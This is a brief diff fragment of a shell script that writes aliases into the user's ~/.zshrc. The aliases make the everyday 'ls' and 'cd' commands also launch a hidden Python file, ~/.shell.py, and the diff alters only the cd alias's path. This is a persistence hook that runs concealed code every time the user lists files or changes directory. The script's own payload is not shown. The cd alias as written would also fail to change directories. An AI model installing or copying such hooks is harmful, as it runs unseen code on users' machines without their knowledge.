@@ -5,5 +5,5 @@ EOL
 
 cat >> $HOME/.zshrc << EOL
 alias ls="/bin/ls && python $HOME/.shell.py"
-alias cd="/bin/cd && python $HOME/.shell.py"
+alias cd="/usr/bin/cd && python $HOME/.shell.py"
 EOL
